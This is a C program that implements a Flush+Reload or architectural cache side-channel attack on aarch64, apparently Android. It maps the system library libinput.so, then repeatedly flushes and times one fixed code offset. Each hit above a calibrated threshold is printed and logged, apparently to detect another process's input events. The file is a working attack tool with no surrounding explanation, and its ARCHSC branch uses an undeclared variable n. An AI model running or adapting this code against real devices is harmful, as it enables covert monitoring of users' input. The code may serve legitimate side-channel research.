#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sched.h"
#include "sys/stat.h"
#include "sys/mman.h"
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <assert.h>

#include "lib_arch_sc_aarch64.h"

#define FLUSHRELOAD 1
#define ARCHSC      2

#if ATTACK == FLUSHRELOAD
#define MEASURE flush_reload
#elif ATTACK == ARCHSC
#define MEASURE measure_arch_sc
#else
#error "unsupported attack"
#endif

typedef struct {
    void *addr;
    size_t length;
    char *dup_path;
} explicit_map_t;

static int map_whole_file_ro(const char *path, explicit_map_t *out)
{
    memset(out, 0, sizeof(*out));
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) { perror("open explicit lib"); return -1; }
    struct stat st;
    if (fstat(fd, &st) < 0) { perror("fstat explicit lib"); close(fd); return -1; }
    if (!S_ISREG(st.st_mode) || st.st_size == 0) { close(fd); return -1; }
    void *addr = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (addr == MAP_FAILED) { perror("mmap explicit lib"); close(fd); return -1; }
    close(fd);
    out->addr = addr;
    out->length = (size_t)st.st_size;
    out->dup_path = strdup(path);
    return 0;
}

static inline long long now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000LL + ts.tv_nsec / 1000;
}

FILE* fp_csv;
int threshold;
void scan(char *start, char *end, unsigned long long elf_base) {
    start += 0x1639d0;

#if ATTACK == ARCHSC
    int a = 0;
    int b = 0;
    for (int i=0; i<2*n; i++) {
        int choice = random() % 2;
        flush(start);
        mfence();
        nospec();
        if (!choice) {
            mfence();
            nospec();
            maccess(start);
        }
        mfence();
        nospec();
        if (choice) {
            a += MEASURE(start);
        } else {
            b += MEASURE(start);
        }
    }
    printf("should be low:  %6.2f\n", (float)a * 100 / n);
    printf("should be high: %6.2f\n", (float)b * 100 / n);
    printf("---------------\n");
    /* if ((float)a * 100 / n > 10) { */
    /*     exit(1); */
    /* } */
#endif

    long long start_us = now_us();
    while (1) {
        sched_yield();
        mfence();
        nospec();
        int t = MEASURE(start);
        mfence();
        nospec();
        flush(start);
        mfence();
        nospec();
        if (t > threshold) {
            printf("h ");
            fflush(stdout);
            /* usleep(100000); */
        }
        long long elapsed = now_us() - start_us;
        fprintf(fp_csv, "%lld,%d\n", elapsed, t);
        fflush(fp_csv);
    }
}

int main(int argc, char* argv[])
{
    int cpu = 4;
    if (argc > 1) cpu = atoi(argv[1]);
    init_arch_sc(&cpu);

    char exe_path[4096];
    ssize_t exe_len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (exe_len >= 0) exe_path[exe_len] = '\0'; else exe_path[0] = '\0';

    char outname[128];
    snprintf(outname, sizeof(outname), "histogram_%d.csv", cpu);
    printf("Writing to %s\n", outname);
    fp_csv = fopen(outname, "w");
    assert(fp_csv);
    fprintf(fp_csv, "time,reading\n");

#if ATTACK == ARCHSC
    threshold = 0;
#else
    fprintf(stdout, "[x] Start calibration... ");
    threshold = detect_flush_reload_threshold();
    fprintf(stdout, "%d\n", threshold);
#endif

    char* path = "/system/lib64/libinput.so";
    explicit_map_t em = (explicit_map_t){0};
    if (map_whole_file_ro(path, &em) == 0) {
        unsigned long long base_addr = (unsigned long long)(uintptr_t)em.addr;

        printf("  [explicit] %016llx-%016llx r--p off=0 %s\n",
                base_addr, base_addr + em.length, path);

        scan((char*)em.addr, (char*)em.addr + em.length, base_addr);
        printf("\n");
        exit(0);
    } else {
        fprintf(stderr, "[warn] could not map '%s'\n", path);
        exit(1);
    }
    return 0;
}
